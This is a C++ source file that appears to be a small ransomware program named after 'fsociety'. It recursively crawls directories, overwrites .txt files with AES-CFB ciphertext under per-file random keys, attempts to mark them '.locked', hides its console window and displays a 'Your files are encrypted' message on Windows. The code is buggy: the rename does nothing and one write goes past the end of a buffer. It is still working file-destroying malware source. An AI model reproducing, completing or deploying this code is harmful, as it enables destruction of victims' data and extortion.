#include <iostream>
#include <stdlib.h>
#include <cstring>
#include <fstream>

#include "cryptopp/osrng.h"
#include "cryptopp/modes.h"
#include "cryptopp/aes.h"
#include "cryptopp/filters.h"
#include "fsociety.h"

using namespace CryptoPP;
using namespace std;



string fsociety::number_to_string(int x){
    if(!x) return "0";
        string s,s2;
        while(x){
            s.push_back(x%10 + '0');
            x/=10;
        }
    reverse(s.begin(),s.end());
    return s;
}

int fsociety::listfiledirectory(char *directory){
    DIR *dir;
    struct dirent *entry;
    if((dir = opendir(directory)) != NULL){
	while((entry = readdir(dir)) != NULL){
	    if(strcmp(entry->d_name, "..") != 0 && strcmp(entry->d_name,".") != 0)
	    {
		// concat three char*
		size_t len_folder = strlen(directory);
		size_t len_name = strlen(entry->d_name);
		size_t len_slash = strlen(this->slash);
		char *concat = (char *) malloc(len_folder + len_slash + len_name +1);
		memcpy(concat, directory, len_folder);
		memcpy(concat + len_folder, this->slash, len_slash);
		memcpy(concat + len_folder + len_slash,entry->d_name, len_name);
		concat[len_folder + len_slash + len_name] = '\0';
		//
		if(is_directory(concat) == 1)
		{
		    this->listfiledirectory(concat);	    
		}
		else
		{
		    //cout << entry->d_name << endl;
		    this->open_file(concat);
		}
	    }
	}
	closedir(dir);
    }
    //std::cout << "start : " << this->nb_file << std::endl;
    return 0;
}

int fsociety::is_directory(char *path)
{
    DIR *dir;
    if((dir = opendir(path)) != NULL)
    {
	closedir(dir);
	return 1;
    }
    return 0;
}

int fsociety::lock_file(char *path){
    char *locked_ext = ".locked";
    size_t len_path = strlen(path);
    size_t len_locked = strlen(locked_ext);
    char *new_name = (char *) malloc(len_path + len_locked + 1);
    memcpy(new_name, path, len_path);
    memcpy(new_name + len_path, locked_ext, len_locked);
    new_name[len_path + len_locked + 1] = '\0';
    rename(path, path);
    this->nb_file++;
    //cout << "renamed !" << endl;
    return 0;
}

byte* fsociety::generate_key(void){
    
    AutoSeededRandomPool rnd;
    byte* key = new byte[AES::DEFAULT_KEYLENGTH+1];
    rnd.GenerateBlock(key, AES::DEFAULT_KEYLENGTH);
    key[AES::DEFAULT_KEYLENGTH] = '\0';
    return key;
}

byte* fsociety::generate_iv(void){
    AutoSeededRandomPool rnd;
    byte* iv = new byte[AES::BLOCKSIZE+1];
    rnd.GenerateBlock(iv, AES::BLOCKSIZE);
    iv[AES::BLOCKSIZE] = '\0';
    return iv;
}

byte* fsociety::encrypt(byte* iv, byte* key, int keyLength, byte* data, int dataLength)
{
    byte* out = new byte[dataLength];
    CFB_Mode<AES>::Encryption cfbEncryption(key, keyLength, iv);
    cfbEncryption.ProcessData(out, data, dataLength);
    return out;
}

byte* fsociety::decrypt(byte* iv, byte* key, int keyLength, byte* cipher, int cipherLength)
{
    byte* plain = new byte[cipherLength];
    CFB_Mode<AES>::Decryption cfbDecryption(key, keyLength, iv);
    cfbDecryption.ProcessData(plain, cipher, cipherLength);
    return plain;
}

byte* fsociety::fucksociety(char *input){
    byte* iv = this->generate_iv();
    byte* key = this->generate_key();
    this->secret_key = key;
    this->secret_iv = iv;
    int len = strlen(input);
        
    byte* init = reinterpret_cast<byte*>(input);
    byte* cipher = this->encrypt(iv, key, AES::DEFAULT_KEYLENGTH, init,len);
    byte* plain = this->decrypt(iv, key, AES::DEFAULT_KEYLENGTH, cipher, len);

    return cipher;
}

int fsociety::encrypt_file(char *path, const char *content){
    
    byte* encrypt = this->fucksociety((char*)content);
    //cout << "encrypt : " << encrypt << endl;
    ofstream fichier(path, ios::out | ios::trunc);
    if(fichier){
	fichier << encrypt;
	//cout << "encrypted" << endl;
	fichier.close();
    }
    this->lock_file(path);
    return 0;
}

int fsociety::open_file(char *path){
    char *content_char;
    string content;
    string final_content;
    ifstream fichier(path, ios::in);
    if(fichier){
	while(getline(fichier, content))
	{
	    //cout << content << endl;
	    final_content = final_content + content;
	}
	//size_t len_content = strlen(content);
	//memcpy(content_modified, content, len_content);
	content_char = (char*)final_content.c_str();
	if(strstr(path, ".txt") != NULL){
	    if(strstr(path,".locked") == NULL){
		this->encrypt_file(path, content_char);
	    }
	}
	fichier.close();
	return 0;
    }
    return 1;
}

byte* fsociety::get_secret_key(void){
    return this->secret_key;
}

byte* fsociety::get_secret_iv(void){
    return this->secret_iv;
}

#if defined(WIN32)
int fsociety::show_democracy(void){
    MessageBox(0, "Your files are encrypted", "#OPdailyallowance", 0);
}

int fsociety::hide_console(void){
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
}
#endif
